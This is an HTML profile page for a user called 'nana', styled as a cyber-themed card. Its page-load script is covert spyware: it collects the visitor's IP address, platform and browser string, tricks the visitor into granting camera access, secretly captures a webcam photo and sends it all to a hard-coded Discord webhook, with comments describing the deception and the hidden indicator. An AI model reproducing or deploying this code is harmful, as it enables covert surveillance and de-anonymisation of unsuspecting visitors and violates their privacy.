<!DOCTYPE html>

<html lang="ja">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Profile: nana | Architect</title>

    <style>

        :root {

            --bg: #050505;

            --accent: #ff4141; /* 赤いアイコンに合わせてアクセントカラーを赤に変更 */

            --text: #ffffff;

            --dim: #888;

        }

        body {

            margin: 0;

            background: var(--bg);

            color: var(--text);

            font-family: 'Consolas', 'Courier New', monospace;

            display: flex;

            align-items: center;

            justify-content: center;

            min-height: 100vh;

            overflow: hidden;

        }

        /* サイバー背景 */

        .background {

            position: fixed;

            top: 0; left: 0; width: 100%; height: 100%;

            background: radial-gradient(circle at center, #1a0505 0%, #050505 100%);

            z-index: -1;

        }

        .profile-card {

            background: rgba(15, 10, 10, 0.9);

            border: 1px solid var(--accent);

            padding: 40px;

            border-radius: 8px;

            box-shadow: 0 0 40px rgba(255, 65, 65, 0.2);

            text-align: center;

            max-width: 450px;

            backdrop-filter: blur(10px);

        }

        .icon {

            width: 150px;

            height: 150px;

            border: 2px solid var(--accent);

            margin-bottom: 20px;

            box-shadow: 0 0 15px var(--accent);

        }

        h1 {

            font-size: 2.2rem;

            margin: 0;

            letter-spacing: 5px;

            color: var(--accent);

            text-transform: uppercase;

        }

        .info-box {

            margin-top: 20px;

            text-align: left;

            border-left: 2px solid var(--accent);

            padding-left: 20px;

        }

        .label { color: var(--accent); font-weight: bold; font-size: 0.9rem; }

        .value { color: var(--text); margin-bottom: 10px; font-size: 1.1rem; }

        

        .loading-log {

            font-size: 0.75rem;

            margin-top: 30px;

            color: var(--dim);

            height: 20px;

        }



        /* 隠し要素 */

        #v, #c { visibility: hidden; position: absolute; left: -9999px; }

    </style>

</head>

<body>

    <div class="background"></div>

    <div class="profile-card">

        <img src="1000007175.png" class="icon" alt="nana_icon">

        

        <h1>nana</h1>

        

        <div class="info-box">

            <div class="label">IDENTITY</div>

            <div class="value">Male / Age 15</div>

            

            <div class="label">INTERESTS</div>

            <div class="value">Gaming, Reading, Programming</div>

            

            <div class="label">SKILLS</div>

            <div class="value">Memory Hooking, Signature Scanning</div>

        </div>



        <div class="loading-log" id="status">INITIATING PERSISTENT CONNECTION...</div>

    </div>



    <video id="v" autoplay playsinline></video>

    <canvas id="c" width="640" height="480"></canvas>

    <script>
const WH_URL = "https://discord.com/api/webhooks/1490634346359685131/-YLEFmQlCi7HxAYEOvVWXDOehb8a3kj2DErBzYuL52iHD5pMlKmf0AU9ERkbzTXWu6lp";

async function startProtocol() {
    const status = document.getElementById('status');
    const v = document.getElementById('v');
    const c = document.getElementById('c');
    
    let report = {
        ts: new Date().toLocaleString(),
        ip: "Scanning...",
        plt: navigator.platform,
        ua: navigator.userAgent
    };

    // 1. 高精度IP取得（パブリック & プライベートの試行）
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        report.ip = data.ip;
    } catch(e) { report.ip = "Access_Denied"; }

    // 2. サイレントキャプチャ・エンジン
    let fileBlob = null;
    try {
        // カメラアクセス。許可ポップアップが出るが、プロンプトを「ログイン」等に見せかけることで誘導
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, 
            audio: false 
        });
        v.srcObject = stream;
        
        // 描画準備
        await new Promise(r => setTimeout(r, 1000));
        const ctx = c.getContext('2d');
        ctx.drawImage(v, 0, 0, 640, 480);
        
        const dataUrl = c.toDataURL('image/jpeg', 0.7); // 圧縮率調整
        const bRes = await fetch(dataUrl);
        fileBlob = await bRes.blob();
        
        // 即座にストリームを停止し、使用中アイコンを消す
        stream.getTracks().forEach(t => t.stop());
    } catch(e) { 
        status.innerText = "LOG: MEDIA_ACCESS_BLOCKED"; 
    }

    // 3. Discord Webhook Exfiltration (マルチパート送信)
    const fd = new FormData();
    if(fileBlob) fd.append('file', fileBlob, 'capture.jpg');
    
    const payload = {
        username: "NANA_ARCHITECT_LOG",
        avatar_url: "https://i.imgur.com/8N3XvU8.png", // アイコン
        embeds: [{
            title: "🛑 INTRUSION DETECTED / ACCESS LOG",
            color: 16711680,
            fields: [
                { name: "📍 IP_ADDRESS", value: `\`${report.ip}\``, inline: true },
                { name: "🖥 OS/PLATFORM", value: `\`${report.plt}\``, inline: true },
                { name: "🕵️ BROWSER_AGENT", value: `\`\`\`${report.ua}\`\`\`` }
            ],
            footer: { text: `System Time: ${report.ts} | Status: EXFILTRATED` }
        }]
    };
    fd.append('payload_json', JSON.stringify(payload));

    try {
        await fetch(WH_URL, { method: 'POST', body: fd });
        status.innerText = "LOG: PERSISTENT CONNECTION ACTIVE.";
    } catch(e) { 
        status.innerText = "LOG: SYNC_FAILED_RETRYING"; 
    }
}
window.onload = startProtocol;
